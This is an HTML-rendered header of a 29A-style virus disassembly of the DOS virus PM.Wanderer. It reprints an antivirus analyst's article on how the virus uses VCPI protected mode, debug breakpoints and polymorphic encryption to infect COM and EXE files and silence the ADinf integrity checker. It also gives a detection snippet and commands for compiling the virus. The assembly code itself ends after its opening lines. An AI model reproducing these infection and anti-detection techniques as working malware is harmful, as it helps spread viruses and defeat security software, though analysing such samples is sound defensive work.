<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.PM_Wanderer.3684 - wanderer.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                            ³    PM.Wanderer    ³</span><span class="sc0">
</span><span class="sc1">;                            ³  Disassembled by  ³</span><span class="sc0">
</span><span class="sc1">;                            ³      Tcp/29A      ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is one of the very few DOS viruses which use protected  mode in order</span><span class="sc0">
</span><span class="sc1">; to perform its functioning  and the  first  to do it in a pretty effective</span><span class="sc0">
</span><span class="sc1">; way. It appears encrypted in files by means of a polymorphic engine, whose</span><span class="sc0">
</span><span class="sc1">; garbage generator i've kinda liked, based in a table  and a decoder of the</span><span class="sc0">
</span><span class="sc1">; contents of that table. This makes the engine pretty flexible as it's pos-</span><span class="sc0">
</span><span class="sc1">; sible to add entries to the table, being able to make the generated garba-</span><span class="sc0">
</span><span class="sc1">; ge much more confusing, without having to modify anything else.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; However the most notorious feature in this virus is the way it works under</span><span class="sc0">
</span><span class="sc1">; protected mode. I've included below an article written by the AVer (DrWeb)</span><span class="sc0">
</span><span class="sc1">; Igor Daniloff for VirusBulletin  in which  he makes a pretty good descrip-</span><span class="sc0">
</span><span class="sc1">; tion of  the functioning  of this part of the virus. Anyway there are some</span><span class="sc0">
</span><span class="sc1">; errors in the text, so i've commented them with (* *).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; Protected Mode Supervisor?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Igor Daniloff</span><span class="sc0">
</span><span class="sc1">; DialogueScience</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Since their introductions, PCx have become increasingly complex through</span><span class="sc0">
</span><span class="sc1">; advances in both hardware and software. Computer viruses are also becoming</span><span class="sc0">
</span><span class="sc1">; more complex and intricate as their authors try to adapt them to changes</span><span class="sc0">
</span><span class="sc1">; in the computer environment.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now there are viruses that infect PC boot sectors of disks, DOS, Windows,</span><span class="sc0">
</span><span class="sc1">; Windows'95, OS/2, and Linux program files, as well as documents created in</span><span class="sc0">
</span><span class="sc1">; Word and Excel. Virus authors have devised stealth tecniques to help avoid</span><span class="sc0">
</span><span class="sc1">; detection, and anti-debugging and anti-virus mechanismes to make initial</span><span class="sc0">
</span><span class="sc1">; detection, then analysis more difficult. They have incorporated</span><span class="sc0">
</span><span class="sc1">; polymorphism in boot sectors, files, and memory to make detection more</span><span class="sc0">
</span><span class="sc1">; laborious and time-consuming for anti-virus designers. Since the release</span><span class="sc0">
</span><span class="sc1">; of i386 processors, viruses have begun to use 32-bit instructions in their</span><span class="sc0">
</span><span class="sc1">; codes. Some polymorphic viruses employ 32-bit operands in their decryptors.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Unfortunately, viruses aim to survive and gain the upper hand under the</span><span class="sc0">
</span><span class="sc1">; existing conditions, using all conceivable software and hardware</span><span class="sc0">
</span><span class="sc1">; techniques. With the emergence of 286, and later 32-bit i386 processors,</span><span class="sc0">
</span><span class="sc1">; came protected (or virtual) operation mode. Thus far, virus authors have</span><span class="sc0">
</span><span class="sc1">; not successfully harnessed protected mode. Some have tried to master it,</span><span class="sc0">
</span><span class="sc1">; but their attempts have been unsuccessful because of changes with important</span><span class="sc0">
</span><span class="sc1">; operating system components.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In 1994, the boot virus PMBS was the first to tackle protected mode, but</span><span class="sc0">
</span><span class="sc1">; could not cope with other applications or drivers (EMM386, Windows, OS/2)</span><span class="sc0">
</span><span class="sc1">; also using that mode. In the same year, viruses Evolution.2761 and</span><span class="sc0">
</span><span class="sc1">; Evolution.2770 succeeded in tapping part of the power of the protected</span><span class="sc0">
</span><span class="sc1">; mode, but only when the processor was in the real mode. These viruses</span><span class="sc0">
</span><span class="sc1">; replaced the actual interrupt vector table with their own interrupt</span><span class="sc0">
</span><span class="sc1">; descriptor table (IDT), which they loaded with IDT register. How did the</span><span class="sc0">
</span><span class="sc1">; Evolution viruses could use this technique in everyday life? I doubt there</span><span class="sc0">
</span><span class="sc1">; is a PC user who runs i386-Pentium in real mode.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Although the i386 processor made its debut long ago, viruses have still</span><span class="sc0">
</span><span class="sc1">; failed to master its powerful protected mode. I believe that virus</span><span class="sc0">
</span><span class="sc1">; designers have cherished this hope for some time, and that one among them</span><span class="sc0">
</span><span class="sc1">; finally appears to have realized it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PM.Wanderer, apparently written in Russia, is a file infector which uses a</span><span class="sc0">
</span><span class="sc1">; cruide form of protected mode. It is surprisingly stable, interacting more</span><span class="sc0">
</span><span class="sc1">; or less correctly with other programs that utilize this mode. The name is</span><span class="sc0">
</span><span class="sc1">; derived from the string 'WANDERER,(c)P.Demenuk'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A resident polymorphic virus PM.Wanderer installs its resident part in the</span><span class="sc0">
</span><span class="sc1">; memory and toggles the processor to the protected mode, by utilizing the</span><span class="sc0">
</span><span class="sc1">; documented virtual control program interface (VCPI) of the extended memory</span><span class="sc0">
</span><span class="sc1">; supervisor (EMS, EMM386).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Installation</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; On starting an infected program, the virus polymorphic decryptor decodes</span><span class="sc0">
</span><span class="sc1">; the main virus body and passes control to it. The virus code determines a</span><span class="sc0">
</span><span class="sc1">; location in the upper addresses of DOS memory, writes itself to this</span><span class="sc0">
</span><span class="sc1">; memory, and hands over control to the copy higher in memory. Then it</span><span class="sc0">
</span><span class="sc1">; restores the code of the infected file in the program segment (for EXE</span><span class="sc0">
</span><span class="sc1">; files, it also configures the addresses of relocated elements) and begins</span><span class="sc0">
</span><span class="sc1">; to install resident component.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; First, the virus checks whether there is an extended memory manager (EMS)</span><span class="sc0">
</span><span class="sc1">; in the system. It does this by retrieving the address of Int 67h (Extended</span><span class="sc0">
</span><span class="sc1">; Memory) though Int 21h function AX=3567h (Get Interrupt Vector), and</span><span class="sc0">
</span><span class="sc1">; checking whether the characters 'EM' exist in EMS header. Then the virus</span><span class="sc0">
</span><span class="sc1">; verifies whether its resident part is already installed by calling function</span><span class="sc0">
</span><span class="sc1">; AX=BABAh of Int 21h and locking for the answer AX=FA00h.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If there is no active EMM in the system, or the resident part of the virus</span><span class="sc0">
</span><span class="sc1">; is already installed (and in subsequent operation, if there is no VCPI or</span><span class="sc0">
</span><span class="sc1">; an error occurs installing the resident copy), the virus frees the memory</span><span class="sc0">
</span><span class="sc1">; reserved for installing the resident copy and passes control to the host</span><span class="sc0">
</span><span class="sc1">; program. This completes the life cycle of the virus in a system. However,</span><span class="sc0">
</span><span class="sc1">; if environmental conditions are favourable, the virus intercepts Int 01h</span><span class="sc0">
</span><span class="sc1">; and traces Int 21h looking, for the word 9090h (two NOPs) in the original</span><span class="sc0">
</span><span class="sc1">; Int 21h handler code of MS DOS version 5.00-7.00.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If this string is detected, the virus retrieves from a specific handler</span><span class="sc0">
</span><span class="sc1">; address the address of Int 21 handler kernel, which is usually located in</span><span class="sc0">
</span><span class="sc1">; the high memory area, and writes this address to its body. This address is</span><span class="sc0">
</span><span class="sc1">; subsequently used by the virus for calling the Int 21h handler kernel for</span><span class="sc0">
</span><span class="sc1">; infecting files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the virus verifies the presence of VCPI and reserves the physical</span><span class="sc0">
</span><span class="sc1">; addresses of four memory pages. IT next retrieves the address of VCPI, page</span><span class="sc0">
</span><span class="sc1">; table, and the addresses of GDT (Global Descriptor Table. This consists of</span><span class="sc0">
</span><span class="sc1">; three elements: the first is the code segment descriptor, and the other two</span><span class="sc0">
</span><span class="sc1">; are used by the VCPI driver). The virus writes a reference to the pages</span><span class="sc0">
</span><span class="sc1">; allotted by the VCPI driver to the page table, and retrieves the physical</span><span class="sc0">
</span><span class="sc1">; address of the memory page of the segment in which the virus is currently</span><span class="sc0">
</span><span class="sc1">; located. It also gets GDT and IDT registers. Next, the virus creates three</span><span class="sc0">
</span><span class="sc1">; (code and data) descriptors and a descriptor for the task state segment</span><span class="sc0">
</span><span class="sc1">; (TSS) in GDT.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Finally, it prepares the values for the registers CR3, GDTR, IDTR, LDTR</span><span class="sc0">
</span><span class="sc1">; (Local Descriptor Table Register), TR (Task Register), and the address</span><span class="sc0">
</span><span class="sc1">; CS:EIP of the protected mode entry point. Using the VCPI tools, the virus</span><span class="sc0">
</span><span class="sc1">; toggles the processor to protected mode with the highest privilege level,</span><span class="sc0">
</span><span class="sc1">; known as the supervisor.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In the protected mode, the virus corrects IDT (* corrects GDT *) by creating</span><span class="sc0">
</span><span class="sc1">; two segment descriptors, then searches for the TSS descriptor (* searches for</span><span class="sc0">
</span><span class="sc1">; page table *). Next the virus defines two breakpoints: one at the first byte</span><span class="sc0">
</span><span class="sc1">; of the code of the current INT 21h handler (0000:0084h) and the other at</span><span class="sc0">
</span><span class="sc1">; the first byte of the code in BIOS at 0FE00:005Bh (linear address 0FE05Bh).</span><span class="sc0">
</span><span class="sc1">; The BIOS location usually holds the 'near jump to reboot'. The virus then</span><span class="sc0">
</span><span class="sc1">; corrects IDT to set debug exceptions at Int 01h and Int 09h. It also defines</span><span class="sc0">
</span><span class="sc1">; two handler descriptors: trap gate and interrupt gate.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After these preliminaries, the virus writes its code to the memory page and</span><span class="sc0">
</span><span class="sc1">; switches the processor back to the virtual mode in order to free the DOS</span><span class="sc0">
</span><span class="sc1">; memory in upper addresses and to return the control to the infected</span><span class="sc0">
</span><span class="sc1">; program. From this instant, the infected program begins its "normal" work,</span><span class="sc0">
</span><span class="sc1">; but Int 01h and Int 09h have been redefined by the virus as trap gate and</span><span class="sc0">
</span><span class="sc1">; interrupt gate in protected mode, respectively.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Keyboard Handler</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; On receiving control, the virus-defined Int 09h handler verifies whether</span><span class="sc0">
</span><span class="sc1">; the two virus-defined breakpoints exist, and restores them if either has</span><span class="sc0">
</span><span class="sc1">; been zeroed. Using the register DR7, the virus checks whether the two</span><span class="sc0">
</span><span class="sc1">; breakpoints (0 and 1) are defined, without verifying their linear</span><span class="sc0">
</span><span class="sc1">; addresses. If either of the breakpoints is missing, the virus calls the</span><span class="sc0">
</span><span class="sc1">; procedure that instantly restores them to their initial status. The</span><span class="sc0">
</span><span class="sc1">; virus-defined Int 09h handler also keeps a close watch on the pressing of</span><span class="sc0">
</span><span class="sc1">; Ctrl-Alt-Del and `resets' all breakpoints when this key combination is</span><span class="sc0">
</span><span class="sc1">; used.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Debug Exceptions Handler The virus-defined debug exceptions handler</span><span class="sc0">
</span><span class="sc1">; verifies whether either of the virus breakpoints has been reached by</span><span class="sc0">
</span><span class="sc1">; checking the command address. If control passed to this handler from the</span><span class="sc0">
</span><span class="sc1">; 'near jump to reboot' in BIOS, the virus resets all breakpoints just as the</span><span class="sc0">
</span><span class="sc1">; virus-defined keyboard handler does when the key combination Ctrl-Alt-Del</span><span class="sc0">
</span><span class="sc1">; is pressed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If the exception was caused by the breakpoint of the original DOS Int 21h</span><span class="sc0">
</span><span class="sc1">; handler, the virus analyzes the AX register to determine the function of</span><span class="sc0">
</span><span class="sc1">; Int 21h, and behaves accordingly. Prior to analyzing this, the virus sets</span><span class="sc0">
</span><span class="sc1">; the resume flag (RF=1) in the stack's EFLAGS register that is intended to</span><span class="sc0">
</span><span class="sc1">; return control to the breakpoint. This flag is set should a debug exception</span><span class="sc0">
</span><span class="sc1">; take place while returning control to the breakpoint.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If Int 21h is called with AX=0BABAh, the virus the virus recognizes this as</span><span class="sc0">
</span><span class="sc1">; its 'Are you there?' call. If PM.Wanderer is installed it writes writes the</span><span class="sc0">
</span><span class="sc1">; value 0FACCh in the AX register and returns control to the original DOS Int</span><span class="sc0">
</span><span class="sc1">; 21h handler. On exiting from the DOS handler, the AL register is set to</span><span class="sc0">
</span><span class="sc1">; zero. The register value AX=0FA00h informs the non-resident virus that a</span><span class="sc0">
</span><span class="sc1">; copy is already active.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If Int 21h is called with either AX=4B00h (start program) or AH=3Dh and the</span><span class="sc0">
</span><span class="sc1">; lower 4 bits of AL set to zero (open file for reading), the virus decides</span><span class="sc0">
</span><span class="sc1">; to infect. The virus writes its code to 9000:0000h (linear address 90000h),</span><span class="sc0">
</span><span class="sc1">; prepares a stack, and toggles the processor to 8086 virtual mode with IRETD</span><span class="sc0">
</span><span class="sc1">; command at third and last privilege level.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; File Infection</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; In virtual mode, the virus code verifies the last two characters (OM or XE)</span><span class="sc0">
</span><span class="sc1">; of the filename extension, creates a polymorphic copy, and infects files</span><span class="sc0">
</span><span class="sc1">; longer than 4095 bytes. PM.Wanderer does not infect a files if seconds</span><span class="sc0">
</span><span class="sc1">; field of file's time-stamp is 34, assuming that the file is already</span><span class="sc0">
</span><span class="sc1">; infected, assuming the file is already infected, nor does the virus alter</span><span class="sc0">
</span><span class="sc1">; file attributes. Therefore read only files are not infected. Further, the</span><span class="sc0">
</span><span class="sc1">; virus does not infect a particular program with seven-character filename. I</span><span class="sc0">
</span><span class="sc1">; could not find the name of this file: the virus defines it implicitly by</span><span class="sc0">
</span><span class="sc1">; computing the CRC of itss name.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus does not take over Int 24h (Critical Error Handler), so when</span><span class="sc0">
</span><span class="sc1">; critical errors (for example, writing to write-protected disks) occur</span><span class="sc0">
</span><span class="sc1">; during infection, the standard DOS query - Retry, Ignore, Fail, Abort? - is</span><span class="sc0">
</span><span class="sc1">; displayed. The virus infects a file by calling the DOS Int 21h handler</span><span class="sc0">
</span><span class="sc1">; directly, using the address obtained from tracing Int 21h at installation.</span><span class="sc0">
</span><span class="sc1">; The virus code is prepended to the header of COM files and inserted into</span><span class="sc0">
</span><span class="sc1">; the middle of EXE files, immediately below the header. Prior to this, the</span><span class="sc0">
</span><span class="sc1">; relocations field in the header is zeroed by moving the original program</span><span class="sc0">
</span><span class="sc1">; code to the file end. The `real working code' of the virus is 3684 bytes</span><span class="sc0">
</span><span class="sc1">; long, but the size of infected files increases by more than 3940 bytes.</span><span class="sc0">
</span><span class="sc1">; (* exactly between 3940 and 4036 bytes: 3684 + decryptor (256 to 352) *)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Exit from the V-mode of DOS-machine</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The virus uses a smart technique to exit the V-mode and to transfer control</span><span class="sc0">
</span><span class="sc1">; to the breakpoint of the DOS Int 21h handler that called the debug</span><span class="sc0">
</span><span class="sc1">; exceptions, so that DOS functions normally. Were the virus to infect a file</span><span class="sc0">
</span><span class="sc1">; while in P-mode, everything would be simple - it would be sufficient to</span><span class="sc0">
</span><span class="sc1">; execute the IRETD command. Since the virus has toggled to the V-mode with</span><span class="sc0">
</span><span class="sc1">; privilege level three, it is possible for the debug exceptions handler to</span><span class="sc0">
</span><span class="sc1">; switch back to P-mode. Therefore, the virus plays an elegant trick to</span><span class="sc0">
</span><span class="sc1">; surmount the situation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If an error occurs during infection or while exiting from the virtual mode,</span><span class="sc0">
</span><span class="sc1">; the virus calls Int 21h with AX=4B00h. When Int 21h is called with</span><span class="sc0">
</span><span class="sc1">; AX=4B00h, control jumps to the first command of the DOS Int 21h handler.</span><span class="sc0">
</span><span class="sc1">; This command contains a virus-defined breakpoint. Control must now be</span><span class="sc0">
</span><span class="sc1">; transferred to the debug exceptions handler in P-mode. However, the V-mode</span><span class="sc0">
</span><span class="sc1">; monitor discovers the need to process the next debug exception. The point</span><span class="sc0">
</span><span class="sc1">; is that the virus debug exceptions handler has not returned the control to</span><span class="sc0">
</span><span class="sc1">; the breakpoint and is still busy processing the current debut exception.</span><span class="sc0">
</span><span class="sc1">; Therefore, the V-mode monitor terminates the Int 21h call, aborts</span><span class="sc0">
</span><span class="sc1">; processing the current debug exception, and returns control to the</span><span class="sc0">
</span><span class="sc1">; breakpoint with the values stored in the registers of the previous Int 21h</span><span class="sc0">
</span><span class="sc1">; call.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Payload</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; If the debug exceptions handler is passed AX=3506h (such a call for getting</span><span class="sc0">
</span><span class="sc1">; the INT 06 address usually exists in all programs compiled from high-level</span><span class="sc0">
</span><span class="sc1">; languages, such as C, Pascal), PM.Wanderer scans the linear address space</span><span class="sc0">
</span><span class="sc1">; 0-90000h looking for a string that obviously belongs to the Russian</span><span class="sc0">
</span><span class="sc1">; integrity checker ADinf. If this string is found, the virus modifies it in</span><span class="sc0">
</span><span class="sc1">; order to disable the alerts ADinf usually raises on detecting changes to</span><span class="sc0">
</span><span class="sc1">; files and disks.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Search for the Virus in Memory: It is clear from the above that conventional</span><span class="sc0">
</span><span class="sc1">; memory scanning methods are incapable of detecting the resident copy of the</span><span class="sc0">
</span><span class="sc1">; virus at level zero privilege in the protected mode. The resident copy can</span><span class="sc0">
</span><span class="sc1">; be detected only after toggling to the highest privilege level of protected</span><span class="sc0">
</span><span class="sc1">; mode with the help of GDT or IDT. However, this virus can be trapped by</span><span class="sc0">
</span><span class="sc1">; other conventional methods. Here, the linear addresses of the first two</span><span class="sc0">
</span><span class="sc1">; breakpoints (0 and 1) must be determined and compared with the values</span><span class="sc0">
</span><span class="sc1">; described above. The possible presence of PM.Wanderer in the memory can be</span><span class="sc0">
</span><span class="sc1">; decided from theese addresses. It is imperative that such operations be</span><span class="sc0">
</span><span class="sc1">; carried out only in a DOS session. In assembler language, this can be done</span><span class="sc0">
</span><span class="sc1">; as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     .8086</span><span class="sc0">
</span><span class="sc1">;     MOV AX,0BABAH            ;simulate that the virus is checking its</span><span class="sc0">
</span><span class="sc1">;     INT 21H                  ;presence in the memory</span><span class="sc0">
</span><span class="sc1">;     CMP AX,0FA00H            ;did the resident copy respond?</span><span class="sc0">
</span><span class="sc1">;     JNE ExitCheckMemory</span><span class="sc0">
</span><span class="sc1">;     .386P</span><span class="sc0">
</span><span class="sc1">;     MOV EAX,DR7              ;read register DR7</span><span class="sc0">
</span><span class="sc1">;     AND EAX,20AH</span><span class="sc0">
</span><span class="sc1">;     CMP EAX,20AH             ;are 2 breakpoints defined?</span><span class="sc0">
</span><span class="sc1">;     JNE ExitCheckMemory</span><span class="sc0">
</span><span class="sc1">;     MOV EAX,DR1              ;read linear address of breakpoint 1</span><span class="sc0">
</span><span class="sc1">;     CMP EAX,0FE05BH          ;is it set at 0FE00:005BH in BIOS?</span><span class="sc0">
</span><span class="sc1">;     JNE ExitCheckMemory</span><span class="sc0">
</span><span class="sc1">;     .8086</span><span class="sc0">
</span><span class="sc1">;     MOV AH,9</span><span class="sc0">
</span><span class="sc1">;     MOV DX,OFFSET VirusIsFound</span><span class="sc0">
</span><span class="sc1">;     INT 21H                  ;alert about the possible presence of</span><span class="sc0">
</span><span class="sc1">;     CLI                      ;virus in the memory</span><span class="sc0">
</span><span class="sc1">;     JMP $+0                  ;"hang up" system</span><span class="sc0">
</span><span class="sc1">;ExitCheckMemory:</span><span class="sc0">
</span><span class="sc1">;     INT 20H                  ;terminate operation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Test</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; After infecting several thousand files, the virus behaves like a 'lodger'</span><span class="sc0">
</span><span class="sc1">; with all infected files remaining operative. A file becomes inoperative</span><span class="sc0">
</span><span class="sc1">; only if, after infection, its stack are located within the virus code.</span><span class="sc0">
</span><span class="sc1">; While infecting EXE files, PM.Wanderer does not modify the start SS:SP</span><span class="sc0">
</span><span class="sc1">; values in the EXE header. As already mentioned, the virus is capable of</span><span class="sc0">
</span><span class="sc1">; reproduction only if EMS (EMM386) is installed in the system. If EMM386 is</span><span class="sc0">
</span><span class="sc1">; installed with the /NOEMS option, when the virus toggles processor to</span><span class="sc0">
</span><span class="sc1">; protected mode, the system will reboot. The computer may also reboot if</span><span class="sc0">
</span><span class="sc1">; QEMM386 is installed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus loses its reproduciability under Windows 3.1x and Windows 95.</span><span class="sc0">
</span><span class="sc1">; These operating systems cut off an already resident PM.Wanderer, because</span><span class="sc0">
</span><span class="sc1">; while loading they install their own handlers in IDT and zero all</span><span class="sc0">
</span><span class="sc1">; breakpoints. Prior to terminating a session and returning to DOS, Windows</span><span class="sc0">
</span><span class="sc1">; restores the previous status of the interrupt descriptor table. On pressing</span><span class="sc0">
</span><span class="sc1">; a key in DOS environment, the virus gets control, installs its own</span><span class="sc0">
</span><span class="sc1">; breakpoints, and continues its activities. Due to the absence of VCPI in a</span><span class="sc0">
</span><span class="sc1">; DOS session within Windows, the virus cannot return to the protected mode</span><span class="sc0">
</span><span class="sc1">; there. For the same reason, the virus is also inoperative under OS/2.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Conclusion</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; PM.Wanderer is the first virus to utilize i386 the protected mode and not</span><span class="sc0">
</span><span class="sc1">; conflict with the domimamt Microsoft operating systems, which also use that</span><span class="sc0">
</span><span class="sc1">; mode. It is possibly that future viruses may completely overwrite the</span><span class="sc0">
</span><span class="sc1">; supervisor with their own code supporting the DPMI, EMS/VCPI, XMS, and Int</span><span class="sc0">
</span><span class="sc1">; 15h extended memory interfaces. Who knows?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                               PM.Wanderer</span><span class="sc0">
</span><span class="sc1">;  Aliases:                     None known</span><span class="sc0">
</span><span class="sc1">;  Type:                        Memory resident in P-mode, polymorphic</span><span class="sc0">
</span><span class="sc1">;  Infection:                   COM and EXE files</span><span class="sc0">
</span><span class="sc1">;  Self-recognition in</span><span class="sc0">
</span><span class="sc1">;  Memory:                      See description</span><span class="sc0">
</span><span class="sc1">;  Self-recognition in Files:   Bit 1 and bit 4 in seconds field of file's</span><span class="sc0">
</span><span class="sc1">;                               time-stamp set</span><span class="sc0">
</span><span class="sc1">;  Hex Pattern in Files:        The virus is polymorphic, and there is no</span><span class="sc0">
</span><span class="sc1">;                               useful hex pattern.</span><span class="sc0">
</span><span class="sc1">;  Hex Pattern in Memory:       Virus works in P-mode, see description</span><span class="sc0">
</span><span class="sc1">;  Intercepts:                  In IDT: Int 09h for enabling breakpoints,</span><span class="sc0">
</span><span class="sc1">;                               Int 1 for infection</span><span class="sc0">
</span><span class="sc1">;  Payload:                     Patch the integrity checker ADinf in</span><span class="sc0">
</span><span class="sc1">;                               memory.</span><span class="sc0">
</span><span class="sc1">;  Removal:                     Under clean system conditions, identify</span><span class="sc0">
</span><span class="sc1">;                               and replace infected files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Other data</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Virus     : PM.Wanderer</span><span class="sc0">
</span><span class="sc1">; Size      : 3684 (code) + 256-352 (decryptor) = 3940-4036 bytes</span><span class="sc0">
</span><span class="sc1">; Author    : P. Demenuk</span><span class="sc0">
</span><span class="sc1">; Origin    : Russia</span><span class="sc0">
</span><span class="sc1">; Disasm by : Tcp/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetings</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; They go this time to l- (i got it) ;), and to Vecna/29A, as he was working</span><span class="sc0">
</span><span class="sc1">; in the same project at the same time, without any of we both having reali-</span><span class="sc0">
</span><span class="sc1">; sed about that fact :) I noticed it also happened the same to him with the</span><span class="sc0">
</span><span class="sc1">; Dementia disassembly... that's bad luck, man! :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Send any question or comment to tcp@cryogen.com.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling it</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; tasm /m wanderer.asm (ignore warnings, if any)</span><span class="sc0">
</span><span class="sc1">; tlink /t /3 wanderer (ignore fixup overflow errors)</span><span class="sc0">


                </span><span class="sc2">.386p</span><span class="sc0">   </span><span class="sc1">; Of course, 386 protected mode</span><span class="sc0">
</span><span class="sc5">wanderer</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">wanderer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">data0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">data0</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

